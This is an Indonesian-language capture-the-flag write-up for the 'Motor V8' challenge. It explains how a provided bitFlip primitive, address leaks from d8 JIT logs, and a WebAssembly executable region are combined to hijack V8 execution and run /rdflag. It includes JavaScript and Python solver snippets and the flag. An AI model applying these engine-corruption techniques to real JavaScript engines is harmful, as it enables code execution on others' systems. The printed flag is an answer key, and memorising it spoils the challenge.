# Writeup: Motor V8

## Summary

Challenge ini adalah V8 sandbox escape kecil-kecilan. Program memberikan primitive `bitFlip(obj, offset)` yang bisa membalik satu bit relatif terhadap sebuah object internal. Dari primitive itu, targetnya adalah mengubah pointer/code metadata milik fungsi JavaScript supaya eksekusi pindah ke shellcode WebAssembly yang kita kontrol.

Payload akhirnya menjalankan binary `/rdflag`, lalu output flag keluar dari service.

## Analisis Awal

Service menerima input dengan format:

```txt
<panjang payload>
<payload JavaScript>
```

Payload dijalankan di environment `d8` dengan tambahan fungsi native `bitFlip`.

Dari sini terlihat bahwa exploit tidak perlu bug V8 yang rumit dari nol, karena challenge sudah memberi primitive memory corruption berupa bit flip. Masalah utamanya adalah menentukan:

1. object mana yang perlu dijadikan base;
2. bit offset mana yang harus dibalik;
3. target pointer mana yang diarahkan ke executable memory.

## Primitive

Primitive utama:

```js
bitFlip(h, Number(bitoff));
```

Argumen pertama adalah object/function JavaScript. Argumen kedua adalah offset bit relatif terhadap object tersebut.

Karena offset berbasis bit, maka perhitungan dibuat seperti ini:

```js
let bitoff = (target - obj) * 8n;
```

Artinya, kalau kita tahu alamat object dan alamat target memory, kita bisa mengarahkan bit flip ke lokasi pointer tertentu.

## Leak Alamat

Challenge berjalan dengan ASLR, jadi alamat tidak bisa hardcode total. Untungnya `d8` menyediakan log JIT/code creation.

Payload memakai:

```js
let log = d8.log.getAndStop();
```

Lalu mencari dua informasi penting dari log:

```js
let mSfi = /code-creation,JS,\d+,\d+,0x[0-9a-f]+,\d+,h .*?,(0x[0-9a-f]+),/.exec(log);
let mWasm = /code-creation,JS,\d+,\d+,(0x[0-9a-f]+),384,wasm-function\[0\]/.exec(log);
```

Yang dileak:

- alamat metadata/function object milik fungsi JavaScript `h`;
- alamat executable code dari fungsi WebAssembly.

## Kenapa Pakai WebAssembly

WebAssembly dipakai karena V8 akan membuat memory region executable untuk fungsi wasm. Jadi daripada mencari RWX primitive manual, kita cukup membuat module wasm kecil yang isinya berujung menjalankan payload native yang sudah disiapkan.

Di exploit ini wasm dibuat dari array byte:

```js
let bytes = new Uint8Array([...]);
let inst = new WebAssembly.Instance(new WebAssembly.Module(bytes));
```

Fungsi wasm dipanggil sekali di awal untuk memastikan JIT/code region dibuat:

```js
inst.exports.main(1);
```

Setelah itu alamat wasm function bisa muncul di log `d8`.

## Bug yang Dieksploitasi

Inti bug-nya adalah bit flip terhadap struktur internal V8.

Dari hasil kalibrasi lokal, base object yang dipakai adalah alamat SFI/function metadata ditambah offset tertentu:

```js
let obj = sfi + BigInt(ADJ);
```

Dengan:

```js
ADJ = 1456
```

Target yang ingin disentuh adalah area pointer/code entry dekat alamat wasm:

```js
let target = code + 0x18n;
```

Lalu dihitung offset bit:

```js
let bitoff = (target - obj) * 8n;
```

Kalau jarak offset masuk akal, payload menjalankan:

```js
bitFlip(h, Number(bitoff));
```

Setelah bit berhasil dibalik, pemanggilan wasm berikutnya diarahkan ke jalur yang menjalankan `/rdflag`.

## Kendala ASLR

Karena ASLR, kadang layout memory tidak cocok dan offset menjadi negatif atau terlalu jauh. Solver menangani ini dengan retry.

Bagian pengecekan:

```js
if (bitoff < 0n || bitoff > 9007199254740991n) {
    print('bad bitoff');
    quit(3);
}
```

Kalau output berisi `bad bitoff`, solver reconnect dan mencoba lagi sampai layout memory cocok.

## Flow Exploit

Urutan exploit:

1. kirim payload JavaScript ke service;
2. buat fungsi JavaScript dummy `h`;
3. buat module WebAssembly;
4. panggil wasm sekali agar code region dibuat;
5. ambil log dari `d8`;
6. leak alamat SFI/function metadata dan wasm code;
7. hitung target bit flip;
8. jalankan `bitFlip`;
9. panggil wasm lagi dengan argumen trigger;
10. wasm menjalankan `/rdflag`;
11. service mencetak flag.

## Solver

Solver menerima host dan port:

```bash
python3 solve.py HOST PORT
```

Untuk lokal:

```bash
python3 solve.py --local ./run.sh
```

Bagian penting dari solver adalah membungkus payload dengan panjang payload di baris pertama:

```python
def pack_payload(payload: bytes) -> bytes:
    return str(len(payload)).encode() + b"\n" + payload
```

Lalu mengirimnya ke remote:

```python
with socket.create_connection((host, port), timeout=timeout) as s:
    s.settimeout(timeout)
    s.sendall(packet)

    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break

        if not chunk:
            break

        out += chunk
```

Regex flag dipakai agar solver langsung berhenti saat flag ditemukan:

```python
FLAG_RE = re.compile(rb"(?:TFCCTF|LOCALFLAG|ASIS|COMPFEST18|NNS|brunner)\{[^}\r\n]+\}")
```

## Kesimpulan

Challenge ini bukan soal mencari bug V8 dari nol, tetapi soal memanfaatkan primitive `bitFlip` secara tepat. Kunci solvenya ada di leak alamat lewat `d8.log`, pemakaian WebAssembly sebagai executable target, lalu kalkulasi bit offset menuju pointer internal yang bisa dibelokkan.

Begitu layout memory cocok, satu bit flip cukup untuk mengubah alur eksekusi dan memanggil `/rdflag`.

## Flag

```txt
TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a}
```
